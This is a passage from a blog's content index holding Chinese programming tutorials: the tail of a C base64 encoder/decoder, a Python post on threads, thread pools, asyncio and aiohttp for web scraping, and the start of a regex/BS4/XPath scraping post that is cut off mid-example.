class="number">49</span>,<span class="number">50</span>,<span class="number">51</span></span><br><span class="line">           &#125;;  </span><br><span class="line">    <span class="keyword">long</span> len;  </span><br><span class="line">    <span class="keyword">long</span> str_len;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *res;  </span><br><span class="line">    <span class="keyword">int</span> i,j;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//计算解码后的字符串长度  </span></span><br><span class="line">    len=<span class="built_in">strlen</span>(code);  </span><br><span class="line"><span class="comment">//判断编码后的字符串后是否有=  </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strstr</span>(code,<span class="string">&quot;==&quot;</span>))  </span><br><span class="line">        str_len=len/<span class="number">4</span>*<span class="number">3</span><span class="number">-2</span>;  </span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strstr</span>(code,<span class="string">&quot;=&quot;</span>))  </span><br><span class="line">        str_len=len/<span class="number">4</span>*<span class="number">3</span><span class="number">-1</span>;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">        str_len=len/<span class="number">4</span>*<span class="number">3</span>;  </span><br><span class="line">  </span><br><span class="line">    res=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> <span class="keyword">char</span>)*str_len+<span class="number">1</span>);  </span><br><span class="line">    res[str_len]=<span class="string">&#x27;\0&#x27;</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//以4个字符为一位进行解码  </span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>,j=<span class="number">0</span>;i &lt; len<span class="number">-2</span>;j+=<span class="number">3</span>,i+=<span class="number">4</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        res[j]=((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i]])&lt;&lt;<span class="number">2</span> | (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">1</span>]])&gt;&gt;<span class="number">4</span>); </span><br><span class="line"><span class="comment">//取出第一个字符对应base64表的十进制数的前6位与第二个字符对应base64表的十进制数的后2位进行组合  </span></span><br><span class="line">        res[j+<span class="number">1</span>]=(((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">1</span>]])&lt;&lt;<span class="number">4</span>) | (((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">2</span>]])&gt;&gt;<span class="number">2</span>); </span><br><span class="line"><span class="comment">//取出第二个字符对应base64表的十进制数的后4位与第三个字符对应bas464表的十进制数的后4位进行组合  </span></span><br><span class="line">        res[j+<span class="number">2</span>]=(((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">2</span>]])&lt;&lt;<span class="number">6</span>) | ((<span class="keyword">unsigned</span> <span class="keyword">char</span>)table[code[i+<span class="number">3</span>]]); </span><br><span class="line"><span class="comment">//取出第三个字符对应base64表的十进制数的后2位与第4个字符进行组合  </span></span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> res;  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf =<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">&quot;-d&quot;</span>) == <span class="number">0</span>) </span><br><span class="line">    &#123; </span><br><span class="line">buf = base64_decode(argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);  </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;</span><br><span class="line">buf = base64_encode(argv[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buf);   </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(buf);</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python异步爬虫基础</title>
      <link href="/2022/02/20/python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/02/20/python%E5%BC%82%E6%AD%A5%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h1 id="pyhton异步爬虫基础"><a href="#pyhton异步爬虫基础" class="headerlink" title="pyhton异步爬虫基础"></a>pyhton异步爬虫基础</h1><h2 id="一、多线程-多进程"><a href="#一、多线程-多进程" class="headerlink" title="一、多线程/多进程"></a>一、多线程/多进程</h2><h3 id="多线程："><a href="#多线程：" class="headerlink" title="多线程："></a>多线程：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  多线程</span></span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread  <span class="comment"># 线程类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#实现方法1：</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;func&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = Thread(target=func)  <span class="comment"># 创建线程并给线程安排任务</span></span><br><span class="line">    t.start()  <span class="comment"># 多线程状态为可以开始工作状态, 具体的执行时间由CPU决定</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;main&quot;</span>, i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实现方法2：</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span>(<span class="params">Thread</span>):</span>  <span class="comment">#</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span>  <span class="comment"># 固定的    -&gt; 当线程被执行的时候, 被执行的就是run()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;子线程&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">t = MyThread()</span><br><span class="line">t.run()  <span class="comment"># 方法的调用了. -&gt; 单线程????</span></span><br><span class="line">t.start()  <span class="comment"># 开启线程</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;主线程&quot;</span>, i)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#传参</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>(<span class="params">name</span>):</span>  <span class="comment"># ??</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(name, i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t1 = Thread(target=func, args=(<span class="string">&quot;周杰伦&quot;</span>,))  <span class="comment"># 传递参数必须是元组(逗号)</span></span><br><span class="line">    t1.start()</span><br><span class="line"></span><br><span class="line">    t2 = Thread(target=func, args=(<span class="string">&quot;王力宏&quot;</span>,))</span><br><span class="line">    t2.start()</span><br></pre></td></tr></table></figure><h3 id="多进程："><a href="#多进程：" class="headerlink" title="多进程："></a>多进程：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;子进程&quot;</span>, i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Process(target=func)</span><br><span class="line">    p.start()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;主进程&quot;</span>, i)</span><br></pre></td></tr></table></figure><h2 id="二、线程池"><a href="#二、线程池" class="headerlink" title="二、线程池"></a>二、线程池</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 如何提取单个页面的数据</span></span><br><span class="line"><span class="comment"># 2. 上线程池,多个页面同时抓取</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;data.csv&quot;</span>, mode=<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">csvwriter = csv.writer(f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_one_page</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># 拿到页面源代码</span></span><br><span class="line">    resp = requests.get(url)</span><br><span class="line">    html = etree.HTML(resp.text)</span><br><span class="line">    table = html.xpath(<span class="string">&quot;/html/body/div[2]/div[4]/div[1]/table&quot;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># trs = table.xpath(&quot;./tr&quot;)[1:]</span></span><br><span class="line">    trs = table.xpath(<span class="string">&quot;./tr[position()&gt;1]&quot;</span>)</span><br><span class="line">    <span class="comment"># 拿到每个tr</span></span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> trs:</span><br><span class="line">        txt = tr.xpath(<span class="string">&quot;./td/text()&quot;</span>)</span><br><span class="line">        <span class="comment"># 对数据做简单的处理: \\  / 去掉</span></span><br><span class="line">        txt = (item.replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>) <span class="keyword">for</span> item <span class="keyword">in</span> txt)</span><br><span class="line">        <span class="comment"># 把数据存放在文件中</span></span><br><span class="line">        csvwriter.writerow(txt)</span><br><span class="line">    <span class="built_in">print</span>(url, <span class="string">&quot;提取完毕!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># for i in range(1, 14870):  # 效率及其低下</span></span><br><span class="line">    <span class="comment">#     download_one_page(f&quot;http://www.xinfadi.com.cn/marketanalysis/0/list/&#123;i&#125;.shtml&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建线程池</span></span><br><span class="line">    <span class="keyword">with</span> ThreadPoolExecutor(<span class="number">50</span>) <span class="keyword">as</span> t:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):  <span class="comment"># 199 * 20 = 3980</span></span><br><span class="line">            <span class="comment"># 把下载任务提交给线程池</span></span><br><span class="line">            t.submit(download_one_page, <span class="string">f&quot;http://www.xinfadi.com.cn/marketanalysis/0/list/<span class="subst">&#123;i&#125;</span>.shtml&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;全部下载完毕!&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="三、协程"><a href="#三、协程" class="headerlink" title="三、协程"></a>三、协程</h2><p>​    协程应该就是指，在单线程的条件下，合理的安排程序的I/O操作与需要使用cpu的计算操作的交互，进行任务之间的调度，使得cpu空闲机会减少，使用率上升，以达到提高程序运行效率的目的。</p><p>​    在爬虫中，常用到的三个协程模块为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio <span class="comment">#基础协程模块</span></span><br><span class="line"><span class="keyword">import</span> aiohttp <span class="comment">#协程网络请求模块</span></span><br><span class="line"><span class="keyword">import</span> aiofiles <span class="comment">#协程文件读写模块</span></span><br></pre></td></tr></table></figure><h3 id="asyncio基础："><a href="#asyncio基础：" class="headerlink" title="asyncio基础："></a>asyncio基础：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func1</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫潘金莲&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">3</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫潘金莲&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func2</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫王建国&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫王建国&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func3</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫李雪琴&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">4</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;你好啊, 我叫李雪琴&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment"># 第一种写法</span></span><br><span class="line">    f1 = func1()</span><br><span class="line">    <span class="keyword">await</span> f1  <span class="comment"># 一般await挂起操作放在协程对象前面</span></span><br><span class="line">    <span class="comment"># 第二种写法(推荐)</span></span><br><span class="line">    tasks = [</span><br><span class="line">        asyncio.create_task(func1()),  <span class="comment"># py3.8以后加上asyncio.create_task()</span></span><br><span class="line">        asyncio.create_task(func2()),</span><br><span class="line">        asyncio.create_task(func3())</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="comment"># 一次性启动多个任务(协程)</span></span><br><span class="line">    asyncio.run(main())</span><br></pre></td></tr></table></figure><p>总结基础步骤：</p><ol><li><strong>创建带有<code>async</code>关键字的函数，函数中所有异步操作都需要<code>await</code>修饰；</strong></li><li><strong><code>asyncio.create_task(func1())</code>包裹后，丢进任务列表中</strong></li><li><strong><code>await asyncio.wait(tasks)</code>任务列表整体开始执行</strong></li></ol><h3 id="aiohttp的基本使用："><a href="#aiohttp的基本使用：" class="headerlink" title="aiohttp的基本使用："></a>aiohttp的基本使用：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> aiohttp</span><br><span class="line"></span><br><span class="line">urls = [</span><br><span class="line">    <span class="string">&quot;http://a.jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://b.jpg&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://c.jpg&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">aiodownload</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment"># 发送请求.</span></span><br><span class="line">    <span class="comment"># 得到图片内容</span></span><br><span class="line">    <span class="comment"># 保存到文件</span></span><br><span class="line">    name = url.rsplit(<span class="string">&quot;/&quot;</span>, <span class="number">1</span>)[<span class="number">1</span>]  <span class="comment"># 从右边切, 切一次. 得到[1]位置的内容</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:  <span class="comment"># requests</span></span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> resp:  <span class="comment"># resp = requests.get()</span></span><br><span class="line">            <span class="comment"># 请求回来了. 写入文件</span></span><br><span class="line">            <span class="comment"># 可以自己去学习一个模块, aiofiles</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(name, mode=<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:  <span class="comment"># 创建文件</span></span><br><span class="line">                f.write(<span class="keyword">await</span> resp.content.read())  <span class="comment"># 读取内容是异步的. 需要await挂起, resp.text()</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(name, <span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        tasks.append(aiodownload(url))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>总结基本步骤：</p><ol><li>创建带有<code>async</code>关键字的函数，函数中所有异步操作都需要<code>await</code>修饰；</li><li><strong>使用<code>aiohttp.ClientSession()</code>创建<code>session</code></strong></li><li><strong>使用<code>session</code>中提供的<code>get（）</code>方法请求到url对应的资源</strong></li><li><strong>在已经获得的资源中读取信息也是异步的，需要使用await包裹</strong></li><li><code>asyncio.create_task(func1())</code>包裹后，丢进任务列表中</li><li><code>await asyncio.wait(tasks)</code>任务列表整体开始执行</li></ol><h3 id="aiofiles的基本使用："><a href="#aiofiles的基本使用：" class="headerlink" title="aiofiles的基本使用："></a>aiofiles的基本使用：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">with</span> aiohttp.ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">       <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> resp:</span><br><span class="line">           dic = <span class="keyword">await</span> resp.json()</span><br><span class="line"></span><br><span class="line">           <span class="keyword">async</span> <span class="keyword">with</span> aiofiles.<span class="built_in">open</span>(title, mode=<span class="string">&quot;w&quot;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">               <span class="keyword">await</span> f.write(dic[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;novel&#x27;</span>][<span class="string">&#x27;content&#x27;</span>])  <span class="comment"># 把小说内容写出</span></span><br></pre></td></tr></table></figure><p>总结基本步骤：</p><ol><li>创建带有<code>async</code>关键字的函数，函数中所有异步操作都需要<code>await</code>修饰；</li><li>使用<code>aiohttp.ClientSession()</code>创建<code>session</code></li><li>使用<code>session</code>中提供的<code>get（）</code>方法请求到url对应的资源</li><li>在已经获得的资源中读取信息也是异步的，需要使用await包裹</li><li><strong>调用文件操作时，使用<code>async</code>关键字，并使用<code>aiofiles.open</code>替代<code>file.open</code></strong></li><li><strong>在进行文件读写时，需要用<code>await</code>包裹</strong></li><li><code>asyncio.create_task(func1())</code>包裹后，丢进任务列表中</li><li><code>await asyncio.wait(tasks)</code>任务列表整体开始执行</li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python_re爬虫模块（RE、BS4、Xpath）</title>
      <link href="/2022/02/20/python_re%E6%A8%A1%E5%9D%97/"/>
      <url>/2022/02/20/python_re%E6%A8%A1%E5%9D%97/</url>
      
        <content type="html"><![CDATA[<h1 id="python爬虫模块（RE、BS4、Xpath）"><a href="#python爬虫模块（RE、BS4、Xpath）" class="headerlink" title="python爬虫模块（RE、BS4、Xpath）"></a>python爬虫模块（RE、BS4、Xpath）</h1><h2 id="一、RE模块"><a href="#一、RE模块" class="headerlink" title="一、RE模块"></a>一、RE模块</h2><h3 id="基本使用："><a href="#基本使用：" class="headerlink" title="基本使用："></a>基本使用：</h3><p><code>findall</code>：匹配字符串中所有符合正则的内容</p><p><code>finditer</code>：匹配内容后返回迭代器，从迭代器中取数据可以用循环加<code>.group()</code></p><p><code>search</code>：找到一个结果就返回，返回的结果是match对象，取数据可以用<code>.group()</code></p><p><code>match</code>：从头开始匹配，从第一个字母匹配不到就没有（不常用）</p><p><strong>其中，上述内容的调用通过</strong>：<br>    <code>ret=re.findall(r&#39;正则串&#39;,&#39;匹配目标串&#39;)</code>实现调用。</p><h3 id="预加载："><a href="#预加载：" class="headerlink" title="预加载："></a>预加载：</h3><p><em>预加载正则表达式</em><br>（用于正则表达式较长、且多次使用时的封装）</p><p>格式为:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+&quot;</span>)</span><br><span class="line">ret = obj.finditer(<span class="string">&quot;目标字串666&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> ret:</span><br><span class="line">    <span class="built_in">print</span>(it.group())</span><br></pre></td></tr></table></figure><h3 id="内容提取："><a href="#内容提取：" class="headerlink" title="内容提取："></a>内容提取：</h3><p>​    正则可以用来匹配固定格式的一串字符串，如<code>&lt;html&gt;xxx&lt;html&gt;</code>，然而当我们不想要两侧的<html>，只想要xxx时，需要从正则中取出不重复信息，即内容提取。</p><p>举例说明：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">str</span>=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;aa&#x27;&gt;&lt;span id=&#x27;1&#x27;&gt;qwe&lt;/span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;bb&#x27;&gt;&lt;span id=&#x27;2&#x27;&gt;qwer&lt;/span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;cc&#x27;&gt;&lt;span id=&#x27;3&#x27;&gt;qwert&lt;/span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;dd&#x27;&gt;&lt;span id=&#x27;4&#x27;&gt;qwerty&lt;/span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;div class=&#x27;ee&#x27;&gt;&lt;span id=&#x27;5&#x27;&gt;qwertyu&lt;span&gt;&lt;div&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#原匹配方式</span></span><br><span class="line"><span class="comment">#obj = re.compile(r&quot;&lt;div class=&#x27;.*?&#x27;&gt;&lt;span id=&#x27;\d+&#x27;&gt;.*?&lt;/span&gt;&lt;div&gt;&quot;,re.S)</span></span><br><span class="line"><span class="comment"># re.S :让.可以匹配换行符</span></span><br><span class="line"></span><br><span class="line">obj = re.<span class="built_in">compile</span>(<span class="string">r&quot;&lt;div class=&#x27;(?p&lt;name1&gt;.*?)&#x27;&gt;&lt;span id=&#x27;(?P&lt;name2&gt;\d+)&#x27;&gt;(?P&lt;name3&gt;.*？)&lt;/span&gt;&lt;div&gt;&quot;</span>,re.S)</span><br><span class="line">result = obj.finditer(s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> it <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&#x27;name1&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&#x27;name2&#x27;</span>))</span><br><span class="line">    <span class="built_in">print</span>(it.group(<span class="string">&#x27;name3&#x27;</span>))</span><br><span 